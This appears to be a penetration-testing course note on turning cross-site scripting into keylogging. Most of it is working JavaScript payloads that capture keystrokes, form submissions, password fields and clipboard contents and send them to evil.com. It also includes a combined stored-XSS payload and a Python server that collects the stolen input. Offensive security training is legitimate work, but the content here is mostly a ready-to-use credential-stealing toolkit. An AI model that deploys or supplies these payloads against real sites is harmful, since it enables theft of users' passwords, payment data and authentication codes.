---
tags: [vapt, xss, advanced]
difficulty: advanced
module: "07 - XSS"
topic: "07.19 XSS to Keylogging"
---

# 07.19 — XSS to Keylogging

## What is Keylogging via XSS?

XSS keylogging captures every key a victim presses and sends it to the attacker. This is especially powerful for stealing passwords, credit card numbers, and messages typed AFTER the XSS fires — even if the passwords never appear in the DOM.

```
KEYLOGGING ATTACK FLOW:
  1. XSS payload executes in victim's browser
  2. Payload adds keypress listener to the document
  3. Every keypress → character sent to attacker's server
  4. Attacker sees: "l", "o", "g", "i", "n", ":" spaces, "p", "a", "s", "s" ...
  5. Attacker reconstructs: password = "pass123!" 

HIGH-VALUE TARGETS FOR KEYLOGGING:
  ✓ Login forms (username + password)
  ✓ Payment pages (credit card numbers)
  ✓ Chat applications (private messages)
  ✓ Password managers (master password typed)
  ✓ 2FA/OTP entry forms
  ✓ Banking / cryptocurrency transactions
```

---

## Basic Keylogger

```javascript
// SIMPLE EVENT LISTENER KEYLOGGER:
document.addEventListener('keypress', function(e) {
  new Image().src = 'https://evil.com/k?k=' + encodeURIComponent(e.key);
});

// EXPLANATION:
// document.addEventListener('keypress', fn) → listen to ALL keypresses on page
// e.key → the character pressed (e.g., 'a', 'Enter', 'Backspace')
// Image GET request → exfiltrate character to attacker's server
```

---

## Advanced Keylogger with Context

```javascript
// CAPTURES KEY + FIELD NAME + URL (for context):
document.addEventListener('keypress', function(e) {
  fetch('https://evil.com/key', {
    method: 'POST',
    body: JSON.stringify({
      key: e.key,
      field: document.activeElement.name || document.activeElement.id || 'unknown',
      field_type: document.activeElement.type,
      url: window.location.href,
      timestamp: Date.now()
    }),
    mode: 'no-cors'
  });
});

// NOW ATTACKER SEES:
// {key:"p", field:"password", field_type:"password", url:"https://target.com/login"}
// {key:"a", field:"password", ...}
// {key:"s", field:"password", ...}
// → Can reconstruct: password = "pas..."
```

---

## Buffered Keylogger (More Efficient)

Instead of a request per key, buffer and send in chunks:

```javascript
// BUFFERED — SENDS EVERY 2 SECONDS:
var buffer = [];
var context_field = '';

document.addEventListener('keypress', function(e) {
  // Update context when field changes
  context_field = document.activeElement.name || document.activeElement.id;
  buffer.push({k: e.key, f: context_field, t: Date.now()});
});

// Also capture field change events:
document.addEventListener('focus', function(e) {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
    buffer.push({k: '[FOCUS:' + (e.target.name || e.target.id) + ']', t: Date.now()});
  }
}, true);

// Send buffer every 2 seconds:
setInterval(function() {
  if (buffer.length > 0) {
    fetch('https://evil.com/keys', {
      method: 'POST',
      body: JSON.stringify(buffer),
      mode: 'no-cors'
    });
    buffer = [];
  }
}, 2000);
```

---

## Form Hijacking (Better Than Keylogging)

Instead of capturing individual keys, intercept form submissions — you get the complete input at once:

```javascript
// INTERCEPT ALL FORM SUBMISSIONS:
document.addEventListener('submit', function(e) {
  var form = e.target;
  var data = {};
  
  // Collect all form fields:
  Array.from(form.elements).forEach(function(field) {
    if (field.name) {
      data[field.name] = field.value;
    }
  });
  
  // Exfiltrate:
  fetch('https://evil.com/form', {
    method: 'POST',
    body: JSON.stringify({
      action: form.action,
      method: form.method,
      data: data,
      url: window.location.href
    }),
    mode: 'no-cors'
  });
  
  // Let the form submit normally (don't call e.preventDefault() — sneaky!)
});

// RESULT:
// {action: "/login", method: "POST", data: {username:"victim@email.com", password:"secretpass123"}}
```

---

## Password Field Specific Capture

```javascript
// TARGET ONLY PASSWORD FIELDS:
document.querySelectorAll('input[type="password"]').forEach(function(field) {
  field.addEventListener('input', function() {
    // Capture as user types — triggered on each character change
    fetch('https://evil.com/pwd?v=' + encodeURIComponent(field.value), {mode:'no-cors'});
  });
  
  field.addEventListener('change', function() {
    // Capture when field loses focus (complete password)
    fetch('https://evil.com/pwd-complete?v=' + encodeURIComponent(field.value), {mode:'no-cors'});
  });
});

// ALSO CAPTURE DYNAMICALLY-ADDED FIELDS (SPA):
var observer = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    mutation.addedNodes.forEach(function(node) {
      if (node.nodeType === 1) {
        var pwdFields = node.querySelectorAll('input[type="password"]');
        pwdFields.forEach(function(f) {
          f.addEventListener('input', function() {
            fetch('https://evil.com/pwd?v=' + encodeURIComponent(f.value), {mode:'no-cors'});
          });
        });
      }
    });
  });
});
observer.observe(document.body, {childList: true, subtree: true});
```

---

## Clipboard Capture

```javascript
// CAPTURE WHAT VICTIM PASTES (useful if they paste passwords from password manager):
document.addEventListener('paste', function(e) {
  var pasted = (e.clipboardData || window.clipboardData).getData('text');
  fetch('https://evil.com/paste?data=' + encodeURIComponent(pasted), {mode:'no-cors'});
});

// CAPTURE COPIED TEXT:
document.addEventListener('copy', function(e) {
  var selected = window.getSelection().toString();
  fetch('https://evil.com/copy?data=' + encodeURIComponent(selected), {mode:'no-cors'});
});
```

---

## Complete Keylogger Payload (Stored XSS)

```javascript
// COMPREHENSIVE PAYLOAD FOR STORED XSS:
(function() {
  var buffer = [];
  var activeField = '';
  
  // Listen for field focus changes
  document.addEventListener('focusin', function(e) {
    activeField = e.target.name || e.target.id || e.target.type || 'unknown';
    buffer.push('[FOCUS:'+activeField+']');
  }, true);
  
  // Listen for all keypresses
  document.addEventListener('keypress', function(e) {
    buffer.push(e.key);
  });
  
  // Intercept form submissions
  document.addEventListener('submit', function(e) {
    var formData = {};
    Array.from(e.target.elements).forEach(el => {if(el.name)formData[el.name]=el.value;});
    fetch('https://evil.com/form',{method:'POST',body:JSON.stringify(formData),mode:'no-cors'});
  });
  
  // Capture pastes
  document.addEventListener('paste', function(e) {
    buffer.push('[PASTE:'+((e.clipboardData||window.clipboardData).getData('text'))+']');
  });
  
  // Send buffer every 3 seconds
  setInterval(function() {
    if(buffer.length > 0) {
      fetch('https://evil.com/keys',{method:'POST',body:JSON.stringify({data:buffer,url:location.href}),mode:'no-cors'});
      buffer = [];
    }
  }, 3000);
})();
```

---

## Receiving Keylog Data

```python
# PYTHON SERVER TO RECEIVE AND RECONSTRUCT KEYSTROKES:
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class KeylogReceiver(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length)
        
        try:
            data = json.loads(body)
            print(f"[+] From: {self.client_address[0]}")
            print(f"    URL: {data.get('url', '?')}")
            print(f"    Keys: {''.join(data.get('data', []))}")
        except:
            print(f"[!] Raw: {body}")
        
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, *args): pass

HTTPServer(('0.0.0.0', 8080), KeylogReceiver).serve_forever()
```

---

## Keylogging in Reports

```
IMPACT STATEMENT FOR REPORT:
  The XSS vulnerability allows persistent keylogging of all user input.
  Demonstrated by capturing:
  - Username and password on /login → direct credential theft
  - Credit card number on /checkout → payment data exfiltration
  - 2FA codes on /security/verify → bypasses multi-factor authentication

  All captured data was received in real-time at attacker-controlled server.

SEVERITY: CRITICAL when targeting payment pages or login forms
```

---

## Related Notes
- [[16 - XSS to Session Hijacking]] — alternative exploitation approach
- [[17 - XSS to Account Takeover]] — using captured credentials
- [[03 - Stored XSS]] — persistent keylogging requires stored XSS
- [[05 - Blind XSS]] — XSS Hunter for admin keylogging
- [[21 - XSS Payloads Comprehensive List]] — payload reference
